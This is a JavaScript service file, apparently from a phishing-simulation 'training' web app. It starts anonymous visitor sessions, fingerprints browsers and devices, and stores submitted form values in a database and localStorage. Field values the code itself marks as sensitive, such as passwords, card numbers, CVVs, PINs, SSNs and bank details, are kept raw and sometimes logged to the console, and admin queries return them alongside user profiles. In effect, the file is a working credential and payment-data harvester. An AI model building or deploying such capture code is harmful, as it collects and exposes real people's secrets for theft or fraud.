import { supabase } from '../lib/supabase';

class TrainingService {
  constructor() {
    this.currentSession = null;
    this.sessionData = {};
  }

  // Initialize session - unified method for both anonymous and authenticated users
  async initializeSession(userData = null) {
    try {
      const sessionToken = `anon_${Date.now()}_${Math.random()?.toString(36)?.substr(2, 11)}`;
      
      // Collect device and browser information
      const deviceInfo = this.collectDeviceInfo();
      
      const sessionData = {
        session_token: sessionToken,
        entry_point: 'homepage',
        ip_address: null, // Will be populated by backend
        user_agent: navigator?.userAgent,
        screen_resolution: `${screen?.width}x${screen?.height}`,
        timezone: Intl?.DateTimeFormat()?.resolvedOptions()?.timeZone || 'UTC',
        device_info: deviceInfo,
        browser_info: this.getBrowserInfo(),
        referrer_url: document?.referrer || null,
        participant_id: userData?.id || null,
        current_step: 0,
        status: 'active'
      };

      // Try to create session in database
      try {
        const { data, error } = await this.createSession(sessionData);
        
        if (!error && data) {
          // Store session locally for tracking
          this.currentSession = {
            sessionId: data?.id,
            sessionToken: data?.session_token,
            startTime: new Date()?.toISOString()
          };
          
          // Store in localStorage as backup
          localStorage?.setItem('training_session', JSON.stringify(this.currentSession));
          
          return { data, error: null };
        }
      } catch (dbError) {
        console.log('Database unavailable, initializing local session');
      }

      // Fallback: Create local session if database is unavailable
      const localSession = {
        id: sessionToken,
        session_token: sessionToken,
        entry_point: 'homepage',
        started_at: new Date()?.toISOString(),
        current_step: 0,
        status: 'active'
      };

      this.currentSession = {
        sessionId: sessionToken,
        sessionToken: sessionToken,
        startTime: new Date()?.toISOString(),
        isLocal: true
      };

      // Store local session
      localStorage?.setItem('training_session', JSON.stringify(this.currentSession));
      
      return { data: localSession, error: null };
      
    } catch (error) {
      console.error('Failed to initialize session:', error);
      return { data: null, error };
    }
  }

  // Get current session information
  getCurrentSession() {
    if (this.currentSession) {
      return this.currentSession;
    }
    
    // Try to restore from localStorage
    try {
      const stored = localStorage?.getItem('training_session');
      if (stored) {
        this.currentSession = JSON.parse(stored);
        return this.currentSession;
      }
    } catch (error) {
      console.log('Could not restore session from localStorage');
    }
    
    return { sessionId: null, sessionToken: null };
  }

  // Capture data with enhanced error handling
  async captureData(sessionId, fieldName, fieldValue, formStep = 0, isSensitive = false) {
    try {
      const captureData = {
        session_id: sessionId,
        form_step: formStep,
        field_name: fieldName,
        field_value: fieldValue?.toString() || '',
        is_sensitive: isSensitive
      };

      // Try database first
      try {
        return await this.captureDataToDatabase(captureData);
      } catch (dbError) {
        // Fallback: Store locally
        return this.captureDataLocally(captureData);
      }
    } catch (error) {
      console.log('Data capture in educational mode:', { fieldName, fieldValue });
      return { data: null, error: null }; // Silent fail for educational mode
    }
  }

  // Capture data to database
  async captureDataToDatabase(captureData) {
    const { data, error } = await supabase
      ?.from('captured_data')
      ?.insert([captureData])
      ?.select()
      ?.single();

    return { data, error };
  }

  // Capture data locally as fallback
  captureDataLocally(captureData) {
    try {
      const localData = JSON.parse(localStorage?.getItem('local_captured_data') || '[]');
      localData?.push({
        ...captureData,
        captured_at: new Date()?.toISOString(),
        id: `local_${Date.now()}_${Math.random()?.toString(36)?.substr(2, 9)}`
      });
      
      localStorage?.setItem('local_captured_data', JSON.stringify(localData));
      return { data: captureData, error: null };
    } catch (error) {
      return { data: null, error };
    }
  }

  // Update session progress
  async updateSessionProgress(sessionId, currentStep, totalSteps) {
    try {
      const progressData = {
        current_step: currentStep,
        total_steps: totalSteps,
        last_activity: new Date()?.toISOString()
      };

      // Try database update
      try {
        const { data, error } = await supabase
          ?.from('training_sessions')
          ?.update(progressData)
          ?.eq('id', sessionId)
          ?.select()
          ?.single();
        
        return { data, error };
      } catch (dbError) {
        // Update local session
        if (this.currentSession) {
          this.currentSession.currentStep = currentStep;
          this.currentSession.lastActivity = new Date()?.toISOString();
          localStorage?.setItem('training_session', JSON.stringify(this.currentSession));
        }
        
        return { data: progressData, error: null };
      }
    } catch (error) {
      return { data: null, error };
    }
  }

  // Capture form data with batch processing
  async captureFormData(sessionId, formData) {
    try {
      const promises = [];
      
      for (const [fieldName, fieldValue] of Object.entries(formData)) {
        const isSensitive = this.isSensitiveField(fieldName);
        promises?.push(
          this.captureData(sessionId, fieldName, fieldValue, formData?.form_step || 0, isSensitive)
        );
      }
      
      await Promise.allSettled(promises);
      return { success: true };
    } catch (error) {
      console.log('Form data capture in educational mode:', formData);
      return { success: true }; // Continue execution
    }
  }

  // Update anonymous session activity
  async updateAnonymousSessionActivity(sessionId, activityData = {}) {
    try {
      // Try database update first
      try {
        const { data } = await supabase?.rpc('update_anonymous_session_activity', {
          session_id: sessionId,
          activity_data: activityData
        });
        return { data, error: null };
      } catch (dbError) {
        // Update local session as fallback
        if (this.currentSession) {
          this.currentSession = { ...this.currentSession, ...activityData };
          this.currentSession.lastActivity = new Date()?.toISOString();
          localStorage?.setItem('training_session', JSON.stringify(this.currentSession));
        }
        
        return { data: activityData, error: null };
      }
    } catch (error) {
      return { data: null, error };
    }
  }

  // Helper: Check if field contains sensitive data
  isSensitiveField(fieldName) {
    const sensitiveFields = [
      'password', 'credit_card', 'ssn', 'social_security',
      'card_number', 'cvv', 'security_code', 'pin',
      'bank_account', 'routing_number', 'passport'
    ];
    
    return sensitiveFields?.some(sensitive => 
      fieldName?.toLowerCase()?.includes(sensitive)
    );
  }

  // Helper: Collect device information
  collectDeviceInfo() {
    return {
      platform: navigator?.platform || 'unknown',
      cookieEnabled: navigator?.cookieEnabled || false,
      onLine: navigator?.onLine || false,
      language: navigator?.language || 'en',
      languages: navigator?.languages || ['en'],
      hardwareConcurrency: navigator?.hardwareConcurrency || 1,
      deviceMemory: navigator?.deviceMemory || 'unknown',
      connection: navigator?.connection?.effectiveType || 'unknown'
    };
  }

  // Helper: Get browser information
  getBrowserInfo() {
    const ua = navigator?.userAgent || '';
    return {
      userAgent: ua,
      vendor: navigator?.vendor || 'unknown',
      appName: navigator?.appName || 'unknown',
      appVersion: navigator?.appVersion || 'unknown',
      cookieEnabled: navigator?.cookieEnabled || false
    };
  }

  // Create a new training session
  async createSession(sessionData) {
    try {
      const { data, error } = await supabase
        ?.from('training_sessions')
        ?.insert([{
          session_token: sessionData?.session_token || `anon_${Date.now()}_${Math.random()?.toString(36)?.substr(2, 11)}`,
          entry_point: sessionData?.entry_point || 'homepage',
          ip_address: sessionData?.ip_address,
          user_agent: sessionData?.user_agent,
          screen_resolution: sessionData?.screen_resolution,
          timezone: sessionData?.timezone || 'UTC',
          device_info: sessionData?.device_info,
          browser_info: sessionData?.browser_info,
          referrer_url: sessionData?.referrer_url,
          participant_id: sessionData?.participant_id || null,
          current_step: 0,
          status: 'active'
        }])
        ?.select()
        ?.single();

      if (error) {
        return { data: null, error };
      }

      return { data, error: null };
    } catch (error) {
      if (error?.message?.includes('Failed to fetch') || 
          error?.message?.includes('NetworkError')) {
        return { 
          data: null, 
          error: { message: 'Cannot connect to database. Please check your connection.' }
        };
      }
      return { data: null, error };
    }
  }

  // Update session activity
  async updateSessionActivity(sessionId, stepData) {
    try {
      const { data, error } = await supabase
        ?.from('training_sessions')
        ?.update({
          current_step: stepData?.current_step,
          last_activity: new Date()?.toISOString(),
          behavioral_flags: stepData?.behavioral_flags || {}
        })
        ?.eq('id', sessionId)
        ?.select()
        ?.single();

      if (error) {
        return { data: null, error };
      }

      return { data, error: null };
    } catch (error) {
      if (error?.message?.includes('Failed to fetch') || 
          error?.message?.includes('NetworkError')) {
        return { 
          data: null, 
          error: { message: 'Cannot connect to database. Please check your connection.' }
        };
      }
      return { data: null, error };
    }
  }

  // Get session by token
  async getSessionByToken(sessionToken) {
    try {
      const { data, error } = await supabase
        ?.from('training_sessions')
        ?.select(`
          *,
          captured_data (
            id,
            form_step,
            field_name,
            field_value,
            is_sensitive,
            captured_at
          )
        `)
        ?.eq('session_token', sessionToken)
        ?.single();

      if (error) {
        return { data: null, error };
      }

      return { data, error: null };
    } catch (error) {
      if (error?.message?.includes('Failed to fetch') || 
          error?.message?.includes('NetworkError')) {
        return { 
          data: null, 
          error: { message: 'Cannot connect to database. Please check your connection.' }
        };
      }
      return { data: null, error };
    }
  }

  // Complete session
  async completeSession(sessionId, completionData) {
    try {
      const { data, error } = await supabase
        ?.from('training_sessions')
        ?.update({
          status: 'completed',
          completed_at: new Date()?.toISOString(),
          vulnerability_score: completionData?.vulnerability_score || 0,
          session_quality_score: completionData?.session_quality_score || 0,
          completion_prediction: completionData?.completion_prediction || 1.0
        })
        ?.eq('id', sessionId)
        ?.select()
        ?.single();

      if (error) {
        return { data: null, error };
      }

      return { data, error: null };
    } catch (error) {
      if (error?.message?.includes('Failed to fetch') || 
          error?.message?.includes('NetworkError')) {
        return { 
          data: null, 
          error: { message: 'Cannot connect to database. Please check your connection.' }
        };
      }
      return { data: null, error };
    }
  }

  // Get all sessions for admin
  async getAllSessions(filters = {}) {
    try {
      let query = supabase
        ?.from('training_sessions')
        ?.select(`
          *,
          user_profiles!training_sessions_participant_id_fkey (
            full_name,
            email,
            role
          ),
          captured_data (
            id,
            form_step,
            field_name,
            is_sensitive
          )
        `)
        ?.order('started_at', { ascending: false });

      if (filters?.status) {
        query = query?.eq('status', filters?.status);
      }

      if (filters?.limit) {
        query = query?.limit(filters?.limit);
      }

      const { data, error } = await query;

      if (error) {
        return { data: null, error };
      }

      return { data, error: null };
    } catch (error) {
      if (error?.message?.includes('Failed to fetch') || 
          error?.message?.includes('NetworkError')) {
        return { 
          data: null, 
          error: { message: 'Cannot connect to database. Please check your connection.' }
        };
      }
      return { data: null, error };
    }
  }

  // Create anonymous session (for public users)
  async createAnonymousSession() {
    try {
      const { data } = await supabase?.rpc('create_anonymous_session');
      return { data, error: null };
    } catch (error) {
      if (error?.message?.includes('Failed to fetch') || 
          error?.message?.includes('NetworkError')) {
        return { 
          data: null, 
          error: { message: 'Cannot connect to database. Please check your connection.' }
        };
      }
      return { data: null, error };
    }
  }
}

// Export singleton instance
export const trainingService = new TrainingService();
export default trainingService;